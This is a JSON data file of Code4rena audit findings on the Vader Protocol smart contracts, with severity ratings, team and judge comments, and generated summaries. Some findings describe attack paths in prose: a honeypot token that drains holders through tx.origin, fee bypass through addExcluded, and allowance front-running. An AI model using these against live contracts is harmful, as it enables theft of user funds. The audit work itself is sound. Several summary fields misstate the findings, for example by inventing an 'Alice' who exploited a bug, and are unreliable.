      "content": "\n`Vether.sol` implements a fee on every token transfer, unless either the sender or the recipient exists on a list of excluded addresses `(mapAddress_Excluded)`. However, the `addExcluded()` function in `Vether.sol` has no restrictions on who can call it.\nSo any user can call `addExcluded` with their own address as the argument, and bypass all transfer fees.\n\nAlice calls:\n\n(1) ```Vether.addExcluded(aliceAddress)```, which adds Alice's address to `mapAddress_Excluded`.\n(2) Alice can now freely transfer Vether with no fees.\n\nRecommend adding restrictions to who can call `addExcluded`, perhaps by restricting it to a caller set by `DAO.sol`\n\n**[strictly-scarce (vader) commented](https://github.com/code-423n4/2021-04-vader-findings/issues/189#issuecomment-830609051):**\n > Vether contract is outside of contest\n\n**[dmvt (judge) commented](https://github.com/code-423n4/2021-04-vader-findings/issues/189#issuecomment-849162113):**\n > https://github.com/code-423n4/2021-04-vader-findings/issues/3#issuecomment-849043144\n>\n> > The warden should be paid out on this issue, in my opinion, because the code was included in the repo to be reviewed. The work to review the contract was done despite the fact that the team has addressed the issue and has already deployed `vether.sol`. I do not think that any issues related to `Vether.sol` should be included in the final report generated by @code423n4.\n>\n> It was unclear to me (and obviously most of the wardens) that `Vether.sol` was considered out of scope.\n\n**moneylegobatman (C4 Editor) commented:**\n> Leaving report and discussion in for transparency, since finding was awarded.\n\n",
      "summary": "\nThe `Vether.sol` contract has a bug where anyone can bypass transfer fees by calling the `addExcluded()` function with their own address as the argument. This allows them to freely transfer Vether tokens without paying any fees. This bug can be fixed by adding restrictions to who can call the `addExcluded()` function, possibly by limiting it to a caller set by `DAO.sol`. The issue was raised by a user named Alice, who was able to exploit the bug and transfer tokens without fees. The bug was initially not considered in scope, but the warden who reported it believes they should still be rewarded for their work. The bug has since been fixed, but it was included in the report for transparency.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Vader Protocol",
      "source_link": "https://code4rena.com/reports/2021-04-vader",
      "github_link": "https://github.com/code-423n4/2021-04-vader-findings/issues/189",
      "tags": [],
      "finders": []
    },
    {
      "id": "42159",
      "title": "[H-16] Tokens can be stolen through `transferTo`",
      "impact": "HIGH",
      "content": "\nI know that it's stated that:\n\n> VADER, USDV, SYNTHS all employ the `transferTo()` function, which interrogates for `tx.origin` and skips approvals. The author does not subscribe to the belief that this is dangerous\n\nIn my opinion, it can be very dangerous. Imagine the following scenario:\n\n1. I create a custom attacker ERC20 token that has a hook in the `_transfer` function that checks tx.origin for USDV/VADER/SYNTHS and calls `transferTo` to steal these funds.\n2. I set up a honeypot by providing liquidity to the `BASE <> ATTACKER` pool.\n3. I target high-profile accounts holdinging VADER/USDV/SYNTHS and airdrop them free tokens.\n4. Block explorers / Vader swap websites could show that this token has value and can be traded for actual `BASE` tokens.\n5. User wants to sell the airdropped `ATTACKER` token to receive valuable tokens through the Vader swap and has all their tokens (that are even completely unrelated to the tokens being swapped) stolen.\n\nIn general, a holder of any of the core assets of the protocol risks all their funds being stolen if they ever interact with an unvetted external contract/token.\nThis could even be completely unrelated to the VADER protocol.\n\nRecommend removing `transferTo` and use `permit` + `transferFrom` instead to move tokens from `tx.origin`.\n\n**[strictly-scarce (vader) acknowledged](https://github.com/code-423n4/2021-04-vader-findings/issues/217#issuecomment-828445128):**\n > This attack path has already been assessed as the most likely, no new information is being presented here.\n\n> Do not interact with attack contracts, interacting with an ERC20 is an attack contract.\n\n**[0xBrian commented](https://github.com/code-423n4/2021-04-vader-findings/issues/217#issuecomment-829142947):**\n > @strictly-scarce (vader) What would be the downside of adopting the suggested mitigation? Since we cannot communicate effectively with all users to tell them not to interact with certain kinds of contracts (and even if we could, they may not be able to discern which are OK and which aren't), we don't want to set up a thicket for fraudsters to operate. If the downside of the mitigation is not too bad, I think it could be worth it in order to deny fraudsters an opportunity to steal.\n\n**[Mervyn853 commented](https://github.com/code-423n4/2021-04-vader-findings/issues/217#issuecomment-830582387):**\n > Our decision matrix for severity:\n>\n> 0: No-risk: Code style, clarity, off-chain monitoring (events etc), exclude gas-optimisations\n> 1: Low Risk: UX, state handling, function incorrect as to spec\n> 2: Funds-Not-At-Risk, but can impact the functioning of the protocol, or leak value with a hypothetical attack path with stated assumptions, but external requirements\n> 3: Funds can be stolen/lost directly, or indirectly if a valid attack path shown that does not have handwavey hypotheticals.\n>\n> Recommended: 0\n\n",
      "summary": "\nThe bug report discusses a potential vulnerability in the VADER, USDV, and SYNTHS protocols. The author believes that the use of the `transferTo()` function, which checks for `tx.origin`, could be dangerous. They describe a scenario where an attacker could create a fake ERC20 token and use it to steal funds from users who hold VADER/USDV/SYNTHS tokens. This could happen if the user interacts with the fake token through a Vader swap or other block explorer. The report recommends removing the `transferTo()` function and using `permit` and `transferFrom` instead. Some commenters suggest that this vulnerability is already known and that users should not interact with suspicious contracts. The severity of the bug is rated as a 2, meaning it could impact the functioning of the protocol and potentially lead to the loss of funds. The report suggests that the bug should be addressed with a severity level of 0, which means it is not a direct risk to funds.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Vader Protocol",
      "source_link": "https://code4rena.com/reports/2021-04-vader",
      "github_link": "https://github.com/code-423n4/2021-04-vader-findings/issues/217",
      "tags": [],
      "finders": []
    },
    {
      "id": "42158",
      "title": "[H-14] Missing access restriction on `lockUnits/unlockUnits`",
      "impact": "HIGH",
      "content": "\nThe `Pool.lockUnits` allows anyone to steal pool tokens from a `member` and assign them to `msg.sender`. Anyone can steal pool tokens from any other user.\n\nRecommend adding access control and require that `msg.sender` is the router or another authorized party.\n\n**[strictly-scarce (vader) confirmed](https://github.com/code-423n4/2021-04-vader-findings/issues/208#issuecomment-828478127):**\n> Valid, although this is part of the partially-complete lending code.\n\n",
      "summary": "\nThe `Pool.lockUnits` function allows anyone to take pool tokens from one user and give them to themselves. This can be done by any user, without any restrictions. To fix this, it is recommended to add a control system that only allows authorized parties, such as the router, to use this function. This issue has been confirmed by a user named strictly-scarce and is currently being worked on as part of the lending code.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Vader Protocol",
      "source_link": "https://code4rena.com/reports/2021-04-vader",
      "github_link": "https://github.com/code-423n4/2021-04-vader-findings/issues/208",
      "tags": [],
      "finders": []
    },
    {
      "id": "42157",
      "title": "[H-12] `getAddedAmount` can return wrong results",
      "impact": "HIGH",
      "content": "\nThe `getAddedAmount` function only works correctly when called with `(VADER/USDV, pool)` or `(pool, pool)`.\nHowever, when called with (`token, pool)` where `token` is neither `VADER/USDV/pool`, it returns the wrong results:\n\n1. It gets the `token` balance\n2. And subtracts it from the stored `mapToken_tokenAmount[_pool]` amount which can be that of a completely different token\n\nAnyone can break individual pairs by calling `sync(token1, token2)` where the `token1` balance is less than `mapToken_tokenAmount[token2]`. This will add the difference to `mapToken_tokenAmount[token2]` and break the accounting and result in a wrong swap logic.\n\nFurthermore, this can also be used to swap tokens without having to pay anthing with `swap(token1, token2, member, toBase=false)`.\n\nRecommend adding a require statement in the `else` branch that checks that `_token == _pool`.\n\n**[strictly-scarce (vader) confirmed](https://github.com/code-423n4/2021-04-vader-findings/issues/206#issuecomment-830610039):**\n > Valid, funds can be lost\n\n**[strictly-scarce (vader) commented](https://github.com/code-423n4/2021-04-vader-findings/issues/206#issuecomment-830610281):**\n > Would bundle this issue with:\n> https://github.com/code-423n4/2021-04-vader-findings/issues/205\n\n\n",
      "summary": "\nThe `getAddedAmount` function has a bug that causes it to return incorrect results when called with certain inputs. Specifically, it only works correctly when called with `(VADER/USDV, pool)` or `(pool, pool)`, but when called with (`token, pool)` where `token` is not `VADER/USDV/pool`, it returns the wrong results. This is because it subtracts the `token` balance from the stored `mapToken_tokenAmount[_pool]` amount, which can be for a completely different token. This can be exploited to break individual pairs and swap tokens without paying anything. The recommended solution is to add a `require` statement in the `else` branch that checks that `_token == _pool`. This bug has been confirmed and can result in lost funds. It has been bundled with another related issue.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Vader Protocol",
      "source_link": "https://code4rena.com/reports/2021-04-vader",
      "github_link": "https://github.com/code-423n4/2021-04-vader-findings/issues/206",
      "tags": [],
      "finders": []
    },
    {
      "id": "42156",
      "title": "[H-07] Wrong `calcAsymmetricShare` calculation",
      "impact": "HIGH",
      "content": "\nThe inline-comment defines the number of asymmetric shares as `(u * U * (2 * A^2 - 2 * U * u + U^2))/U^3` but the `Utils.calcAsymmetricShare` function computes `(uA * 2U^2 - 2uU + u^2) / U^3` which is not equivalent as can be seen from the `A^2` term in the first term which does not occur in the second one.\n\nThe associativity on `P * part1` is wrong, and `part2` is not multiplied by `P`.\n\nThe math from the spec is not correctly implemented and could lead to the protocol being economically exploited, as the asymmetric share (which is used to determine the collateral value in base tokens) could be wrong. For example, it might be possible to borrow more than the collateral put up.\n\nRecommend clarifying if the comment or the code is correct and fix them if not.\n\n**[strictly-scarce (vader) confirmed](https://github.com/code-423n4/2021-04-vader-findings/issues/214#issuecomment-828468071):**\n > Valid\n\n**[strictly-scarce (vader) commented](https://github.com/code-423n4/2021-04-vader-findings/issues/214#issuecomment-830635568):**\n > Whilst the math is incorrect, in the current implementation it is not yet implemented, so disagree with Severity (funds not lost), recommend: 2\n\n",
      "summary": "\nThe bug report highlights an issue with the math used in the code for the protocol. The inline-comment and the `Utils.calcAsymmetricShare` function do not match, which could lead to incorrect calculations and potential economic exploitation. The report recommends clarifying and fixing the issue, and suggests a severity level of 2 (on a scale of 1-5, with 5 being the most severe).",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Vader Protocol",
      "source_link": "https://code4rena.com/reports/2021-04-vader",
      "github_link": "https://github.com/code-423n4/2021-04-vader-findings/issues/214",
      "tags": [],
      "finders": []
    },
    {
      "id": "42155",
      "title": "[H-03] Missing DAO functionality to call `changeDAO()` function in Vader.sol",
      "impact": "HIGH",
      "content": "\n`changeDAO()` is authorized to be called only from the DAO (per modifier) but DAO contract has no corresponding functionality to call `changeDAO()` function. As a result, DAO address cannot be changed ([L192-L196](https://github.com/code-423n4/2021-04-vader/blob/3041f20c920821b89d01f652867d5207d18c8703/vader-protocol/contracts/Vader.sol#L192-L196)).\n\nRecommend adding functionality to DAO to be able to call `changeDAO()` of Vader.sol.\n\n**[strictly-scarce (vader) commented](https://github.com/code-423n4/2021-04-vader-findings/issues/161#issuecomment-830606766)**:\n> [#46](https://github.com/code-423n4/2021-04-vader-findings/issues/46)\n\n**[dmvt (judge) commented](https://github.com/code-423n4/2021-04-vader-findings/issues/161#issuecomment-847848752)**:\n > Unlike in issues #140, #157, #158, & #159; without this functionality, missing functionality in the DAO becomes a very serious issue. As a result, this one is very high risk were it to be overlooked.\n\n",
      "summary": "\nThe `changeDAO()` function in the Vader contract can only be called by the DAO, but the DAO does not have the ability to call this function. This means that the DAO address cannot be changed, which is a high-risk issue. It is recommended to add functionality to the DAO so that it can call the `changeDAO()` function in the Vader contract.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Vader Protocol",
      "source_link": "https://code4rena.com/reports/2021-04-vader",
      "github_link": "https://github.com/code-423n4/2021-04-vader-findings/issues/161",
      "tags": [],
      "finders": []
    },
    {
      "id": "42154",
      "title": "[H-01] Unhandled return value of transfer in `transferOut()` of Pools.sol",
      "impact": "HIGH",
      "content": "\nERC20 implementations are not always consistent. Some implementations of transfer and `transferFrom` could return ‘false’ on failure instead of reverting. It is safer to wrap such calls into `require()` statements to handle these failures.\n\nThe transfer call [on L211](https://github.com/code-423n4/2021-04-vader/blob/3041f20c920821b89d01f652867d5207d18c8703/vader-protocol/contracts/Pools.sol#L211) of `transferOut()` could be made on a user-supplied untrusted token address (from the different call sites) whose implementation can be malicious.\n\nFor reference, see similar finding from Consensys Diligence Audit of AAVE Protocol V2\n\nRecommend requirements to check the return value and revert on 0/false or use OpenZeppelin’s SafeERC20 wrapper functions.\n\n**[strictly-scarce (vader) disputed](https://github.com/code-423n4/2021-04-vader-findings/issues/128#issuecomment-830602601):**\n > Not valid. Since the funds came in, and did not revert, they can leave. If the call passes, then the transferout is valid.\n\n",
      "summary": "\nThis bug report talks about a problem with ERC20 implementations, which are used for creating tokens. Sometimes, these implementations do not work in the same way, which can cause issues. In this case, the transfer and `transferFrom` functions may return ‘false’ instead of reverting when there is a problem. This can be dangerous because it could allow malicious actors to take advantage of the system. To fix this, the report suggests using `require()` statements or a library called OpenZeppelin's SafeERC20 to handle these failures. The report also mentions that a similar issue was found in the AAVE Protocol V2. In response to this report, someone disputed the finding, saying that the transfer was valid because the funds were able to leave. However, the report still suggests implementing the recommended requirements to prevent potential problems.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Vader Protocol",
      "source_link": "https://code4rena.com/reports/2021-04-vader",
      "github_link": "https://github.com/code-423n4/2021-04-vader-findings/issues/128",
      "tags": [],
      "finders": []
    },
    {
      "id": "3966",
      "title": "[L-23] events can be emitted  even after failed transaction",
      "impact": "LOW",
      "content": "## Handle\n\nJMukesh\n\n\n## Vulnerability details\n\n## Impact\nwhen anyone try to remove liquidity or wanted swap , their transaction may get failed. Even though transaction got failed , event will be emitted which can be problematic if we are keeping  track record offchain\n\n## Proof of Concept\n  \n  In Pools.sol\n   \n  \n https://github.com/code-423n4/2021-04-vader/blob/main/vader-protocol/contracts/Pools.sol#L92\n\nhttps://github.com/code-423n4/2021-04-vader/blob/main/vader-protocol/contracts/Pools.sol#L101\n\nhttps://github.com/code-423n4/2021-04-vader/blob/main/vader-protocol/contracts/Pools.sol#L163\n\n  in _removeLiquidity(){} function, swap(){} function, burnSynth(){} function,  event is emitted before transferOut(){} function get completed , since transferOut(){} function does not check return value from transfer \n\n https://github.com/code-423n4/2021-04-vader/blob/main/vader-protocol/contracts/Pools.sol#L211\n\n transaction may get failed even though event is emitted\n\n \n\n## Tools Used\n\nNo tool used\n\n## Recommended Mitigation Steps\n\ncheck return value from transfer function in order to know whether transaction got successfully executed or not",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Vader Protocol",
      "source_link": "https://code4rena.com/reports/2021-04-vader",
      "github_link": "https://github.com/code-423n4/2021-04-vader-findings/issues/6",
      "tags": [],
      "finders": []
    },
    {
      "id": "3965",
      "title": "[L-22] Missing DAO functionality to call setParams() function in USDV.sol",
      "impact": "LOW",
      "content": "## Handle\n\n0xRajeev\n\n\n## Vulnerability details\n\n## Impact\n\nsetParams() is authorized to be called only from the DAO (per modifier) but DAO contract has no corresponding functionality to call setParams() function. As a result, blockDelay — a critical parameter used to prevent flash attacks, is stuck with initialized value and cannot be changed.\n\n\n## Proof of Concept\n\nhttps://github.com/code-423n4/2021-04-vader/blob/3041f20c920821b89d01f652867d5207d18c8703/vader-protocol/contracts/USDV.sol#L138-L142\n\n\n## Tools Used\n\nManual Analysis\n\n## Recommended Mitigation Steps\n\nAdd functionality to DAO to be able to call setParams() of USDV.sol.",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Vader Protocol",
      "source_link": "https://code4rena.com/reports/2021-04-vader",
      "github_link": "https://github.com/code-423n4/2021-04-vader-findings/issues/140",
      "tags": [],
      "finders": []
    },
    {
      "id": "3964",
      "title": "[L-21] totalBurnt might be wrong",
      "impact": "LOW",
      "content": "## Handle\n\ngpersoon\n\n\n## Vulnerability details\n\n## Impact\nVether.sol (https://etherscan.io/address/0x4Ba6dDd7b89ed838FEd25d208D4f644106E34279#code) \nis the 4th contract version.\nIt takes the totalBurnt value of the 2nd version of the contract an continues on that.\nIt seem more logical to use the totalBurnt value of the 3rd version of the contract an continues on that.\nThis way the value of totalBurnt is probably not the real value.\n\n## Proof of Concept\nvether.sol:\ncontract Vether4 is ERC20 {\n constructor() public {\n       ...\n        vether2 = 0x01217729940055011F17BeFE6270e6E59B7d0337;                               // Second Vether\n        vether3 = 0x75572098dc462F976127f59F8c97dFa291f81d8b;   \n        ...\n        totalBurnt = VETH(vether2).totalBurnt(); totalFees = 0;\n\n## Tools Used\nEditor\n\n## Recommended Mitigation Steps\nCheck if indeed vether3 should be used and update the code to use vether3",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Vader Protocol",
      "source_link": "https://code4rena.com/reports/2021-04-vader",
      "github_link": "https://github.com/code-423n4/2021-04-vader-findings/issues/32",
      "tags": [],
      "finders": []
    },
    {
      "id": "3963",
      "title": "[L-20] Default value of curatedPoolLimit allows only one curated pool in Router.sol",
      "impact": "LOW",
      "content": "## Handle\n\n0xRajeev\n\n\n## Vulnerability details\n\n## Impact\n\nThe default value of curatedPoolLimit only allows one curated pool at any time. This can be changed with setParams() but DAO does not have this functionality. \n\nThis will affect the scalability of the protocol and significantly limit the liquidity pool value proposition.\n\n## Proof of Concept\n\nhttps://github.com/code-423n4/2021-04-vader/blob/3041f20c920821b89d01f652867d5207d18c8703/vader-protocol/contracts/Router.sol#L85\n\nhttps://github.com/code-423n4/2021-04-vader/blob/3041f20c920821b89d01f652867d5207d18c8703/vader-protocol/contracts/Router.sol#L96\n\nhttps://github.com/code-423n4/2021-04-vader/blob/3041f20c920821b89d01f652867d5207d18c8703/vader-protocol/contracts/Router.sol#L227\n\n\n## Tools Used\n\nManual Analysis\n\n## Recommended Mitigation Steps\n\nChange curatedPoolLimit to a higher value on L85.",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Vader Protocol",
      "source_link": "https://code4rena.com/reports/2021-04-vader",
      "github_link": "https://github.com/code-423n4/2021-04-vader-findings/issues/86",
      "tags": [],
      "finders": []
    },
    {
      "id": "3962",
      "title": "[L-19] Missing input validation may set rewardAddress to zero-address in Vader.sol",
      "impact": "LOW",
      "content": "## Handle\n\n0xRajeev\n\n\n## Vulnerability details\n\n## Impact\n\nFunction setRewardAddress is used by DAO to change rewardAddress from USDV to something else. However, there is no zero-address validation on the address. This may accidentally mint rewards to zero-address.\n\n## Proof of Concept\n\nhttps://github.com/code-423n4/2021-04-vader/blob/3041f20c920821b89d01f652867d5207d18c8703/vader-protocol/contracts/Vader.sol#L80\n\nhttps://github.com/code-423n4/2021-04-vader/blob/3041f20c920821b89d01f652867d5207d18c8703/vader-protocol/contracts/Vader.sol#L209\n\nhttps://github.com/code-423n4/2021-04-vader/blob/3041f20c920821b89d01f652867d5207d18c8703/vader-protocol/contracts/Vader.sol#L183-L186\n\n\n## Tools Used\n\nManual Analysis\n\n## Recommended Mitigation Steps\n\nAdd zero-address check to setRewardAddress.",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Vader Protocol",
      "source_link": "https://code4rena.com/reports/2021-04-vader",
      "github_link": "https://github.com/code-423n4/2021-04-vader-findings/issues/160",
      "tags": [],
      "finders": []
    },
    {
      "id": "3961",
      "title": "[L-18] ERC20 race condition for allowances",
      "impact": "LOW",
      "content": "## Handle\n\ntoastedsteaksandwich\n\n\n## Vulnerability details\n\n## Impact\nDue to the implementation of the approve() function in Vader.sol, Vether.sol and mainnet Vether4 at 0x4Ba6dDd7b89ed838FEd25d208D4f644106E34279, it's possible for a user to over spend their allowance in certain situations.\n\n## Proof of Concept\nThe steps to the attack are as follows:\n\n1) Alice approves an allowance of 5000 VETH to Bob. \n2) Alice attempts to lower the allowance to 2500 VETH.\n3) Bob notices the transaction in the mempool and front-runs it by using up the full allowance with a transferFrom call.\n4) Alice's lowered allowance is confirmed and Bob now has an allowance of 2500 VETH, which can be spent further for a total of 7500 VETH. \n\nOverall, Bob was supposed to be approved for at most 5000 VETH but got 7500 VETH. The POC code can be found here: https://gist.github.com/toastedsteaksandwich/db32472ae5c19c2eb188f07abddd02fa \n\nNote that in the POC, Bob receives 7492.5 VETH instead of 7500 VETH due to transfer fees.\n\n## Tools Used\nHardhat with mainnet forks, pinned to block 12227519.\n\n## Recommended Mitigation Steps\nInstead of having a direct setter for allowances, decreaseAllowance and increaseAllowance functions should be exposed which decreases and increases allowances for a recipient respectively. In this way, if the decreaseAllowance call is front-run, the call should revert as there is insufficient allowance to be decreased. This leaves Bob with at most 5000 VETH, the original allowance.",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Vader Protocol",
      "source_link": "https://code4rena.com/reports/2021-04-vader",
      "github_link": "https://github.com/code-423n4/2021-04-vader-findings/issues/35",
      "tags": [],
      "finders": []
    },
    {
      "id": "3960",
      "title": "[L-17] Out-of-bound index access in function getAnchorPrice",
      "impact": "LOW",
      "content": "## Handle\n\nshw\n\n\n## Vulnerability details\n\n## Impact\n\nOut-of-bound index access is possible in the function `getAnchorPrice` of `Router.sol` if the number of anchors equals 1 or 2. Also, the returned anchor price is not the overall median in those situations.\n\n## Proof of Concept\n\nReferenced code:\n[Router.sol#L288](https://github.com/code-423n4/2021-04-vader/blob/main/vader-protocol/contracts/Router.sol#L288)\n\n## Tools Used\n\nNone\n\n## Recommended Mitigation Steps\n\nConsider using `arrayPrices.length/2` as the index to get the median of prices.",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Vader Protocol",
      "source_link": "https://code4rena.com/reports/2021-04-vader",
      "github_link": "https://github.com/code-423n4/2021-04-vader-findings/issues/313",
      "tags": [],
      "finders": []
    },
    {
      "id": "3959",
      "title": "[L-16] You can vote for proposal still not existent",
      "impact": "LOW",
      "content": "## Handle\n\ns1m0\n\n\n## Vulnerability details\n\n## Impact\nvoteProposal() doesn't check that proposalID <= proposalCount.\n\n## Proof of Concept\nhttps://github.com/code-423n4/2021-04-vader/blob/main/vader-protocol/contracts/DAO.sol#L79\n\n## Tools Used\nManual analysis\n\n## Recommended Mitigation Steps\nin voteProposal()\nrequire(proposalID <= proposalCount, \"Proposal not existent\")\nshould be <= because proposalCount is updated before using it (e.g. https://github.com/code-423n4/2021-04-vader/blob/main/vader-protocol/contracts/DAO.sol#L59) in this way the proposal n. 0 is not assignable i'm not sure if it's wanted or not.",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Vader Protocol",
      "source_link": "https://code4rena.com/reports/2021-04-vader",
      "github_link": "https://github.com/code-423n4/2021-04-vader-findings/issues/273",
      "tags": [],
      "finders": []
    },
    {
      "id": "3958",
      "title": "[L-15] Token can be burn through transfer",
      "impact": "LOW",
      "content": "## Handle\n\ns1m0\n\n\n## Vulnerability details\n\n## Impact\nThe token can be sent to address(0) through a normal transfer() without decreasing the totalSupply as it would with calling burn() and it could cause an unintentional burn.\n\n## Proof of Concept\nhttps://github.com/code-423n4/2021-04-vader/blob/main/vader-protocol/contracts/Vader.sol#L122\nhttps://github.com/code-423n4/2021-04-vader/blob/main/vader-protocol/contracts/USDV.sol#L102\n\n## Tools Used\nManual analysis\n\n## Recommended Mitigation Steps\nConsider checking the recipient address to be != address(0).",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Vader Protocol",
      "source_link": "https://code4rena.com/reports/2021-04-vader",
      "github_link": "https://github.com/code-423n4/2021-04-vader-findings/issues/262",
      "tags": [],
      "finders": []
    },
    {
      "id": "3957",
      "title": "[L-14] flashProof is not effective at the start",
      "impact": "LOW",
      "content": "## Handle\n\npaulius.eth\n\n\n## Vulnerability details\n\n## Impact\nIn contract USDV blockDelay is not initialized and needs to be explicitly set by calling function setParams. Otherwise, it gets a default value of 0 so flashProof is not effective unless the value is set. \n\n## Recommended Mitigation Steps\nIt depends on the intentions, you can initialize it in the constructor (or init function) or maybe this precaution is intended to be turned on later.",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Vader Protocol",
      "source_link": "https://code4rena.com/reports/2021-04-vader",
      "github_link": "https://github.com/code-423n4/2021-04-vader-findings/issues/307",
      "tags": [],
      "finders": []
    },
    {
      "id": "3956",
      "title": "[L-13] calculations of upgradedAmount is not overflow protected",
      "impact": "LOW",
      "content": "## Handle\n\npaulius.eth\n\n\n## Vulnerability details\n\n## Impact\nAs contract Vether4 is using pragma solidity 0.6.4; SafeMath is not enabled by default, thus making this check inside function distribute avoidable (overflow):\n\tupgradedAmount += ownership[i];\n\trequire(upgradedAmount <= maxEmissions, \"Must not send more than possible\");\nOf course, this function can only be called by the deployer (who is later expected to call purgeDeployer) so the issue is only theoretical.\n\n## Recommended Mitigation Steps\nUse SafeMath here or just be informed about this theoretical issue.",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Vader Protocol",
      "source_link": "https://code4rena.com/reports/2021-04-vader",
      "github_link": "https://github.com/code-423n4/2021-04-vader-findings/issues/277",
      "tags": [],
      "finders": []
    },
    {
      "id": "3955",
      "title": "[L-12] curatePool emits Curated event no matter what",
      "impact": "LOW",
      "content": "## Handle\n\npaulius.eth\n\n\n## Vulnerability details\n\n## Impact\nfunction curatePool emits Curated event every time. It should emit this event only when the conditions are fulfilled.\n\n## Recommended Mitigation Steps\nPut this event inside the most inner if block.",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Vader Protocol",
      "source_link": "https://code4rena.com/reports/2021-04-vader",
      "github_link": "https://github.com/code-423n4/2021-04-vader-findings/issues/274",
      "tags": [],
      "finders": []
    },
    {
      "id": "3954",
      "title": "[L-11] listAnchor sets _isCurated to true but forgets other parts of curation",
      "impact": "LOW",
      "content": "## Handle\n\npaulius.eth\n\n\n## Vulnerability details\n\n## Impact\nfunction listAnchor sets _isCurated to true but does not update the curatedPoolCount and does not emit the Curated event. I don't see this curatedPoolCount variable used anywhere so probably it's just needed for the frontend consumption.\n\n## Recommended Mitigation Steps\nI think the best solution would be to replace _isCurated[token] = true; with a call to a function curatePool. It also skips if the same anchor is listed twice.",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Vader Protocol",
      "source_link": "https://code4rena.com/reports/2021-04-vader",
      "github_link": "https://github.com/code-423n4/2021-04-vader-findings/issues/271",
      "tags": [],
      "finders": []
    },
    {
      "id": "3953",
      "title": "[L-10] getAnchorPrice potentially returns the wrong median",
      "impact": "LOW",
      "content": "## Handle\n\n@cmichelio\n\n\n## Vulnerability details\n\n\n## Vulnerability Details\n\nThe `Router.getAnchorPrice` sorts the `arrayPrices` array and always returns the third element `_sortedAnchorFeed[2]`.\nThis only returns the median if `_sortedAnchorFeed` is of length 5, but it can be anything from `0` to `anchorLimit`.\n\n## Impact\n\nIf not enough anchors are listed initially, it might become out-of-bounds and break all contract functionality due to revert, or return a wrong median.\nIf `anchorLimit` is set to a different value than 5, it's also wrong.\n\n## Recommended Mitigation Steps\n\nCheck the length of `_sortedAnchorFeed` and return `_sortedAnchorFeed[_sortedAnchorFeed.length / 2]` if it's odd, or the average of the two in the middle if it's even.",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Vader Protocol",
      "source_link": "https://code4rena.com/reports/2021-04-vader",
      "github_link": "https://github.com/code-423n4/2021-04-vader-findings/issues/213",
      "tags": [],
      "finders": []
    },
    {
      "id": "3952",
      "title": "[L-09] _recordBurn does not handle 0 _eth appropriately",
      "impact": "LOW",
      "content": "## Handle\n\npaulius.eth\n\n\n## Vulnerability details\n\n## Impact\ncontract Vether4 function _recordBurn does not check that _eth > 0, thus it is possible to pass this check multiple times:\n  if (mapEraDay_MemberUnits[_era][_day][_member] == 0)\nIf the user hasn't contributed to this day yet, it updates mapMemberEra_Days, mapEraDay_MemberCount, and mapEraDay_Members. However, when msg.value is 0 it is possible to trigger this condition again and again as mapEraDay_MemberUnits still remains 0.\n\n## Recommended Mitigation Steps\nEither do not allow burns of 0 _eth or add an extra check in the if statement.",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Vader Protocol",
      "source_link": "https://code4rena.com/reports/2021-04-vader",
      "github_link": "https://github.com/code-423n4/2021-04-vader-findings/issues/269",
      "tags": [],
      "finders": []
    },
    {
      "id": "3951",
      "title": "[L-08] The Calculation For nextEraTime Drifts, Causing Eras To Occur Further And Further Into The Future",
      "impact": "LOW",
      "content": "## Handle\n\njvaqa\n\n\n## Vulnerability details\n\n## Impact\n\nThe Calculation For nextEraTime Drifts, Causing Eras To Occur Further And Further Into The Future.\n\nIn Vader.sol, eras are intended to occur every 24 hours.\nThis means that a correct implementation would add 24 hours to the end-time of the previous era to find the end-time of the next era.\nHowever, the current method for calculating the next era's end-time uses block.timestamp, rather than the previous era's end-time.\n\n## Proof of Concept\nThis line of code will cause a perpetual drift of era times, causing each era to actually be 24 hours plus the time between when the last era ended and when Vader._transfer() is next called.\n\n## Recommended Mitigation Steps\n\nIn Vader.sol, change this:\n\nnextEraTime = block.timestamp + secondsPerEra;\n\nto this:\n\nnextEraTime = nextEraTime + secondsPerEra;",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Vader Protocol",
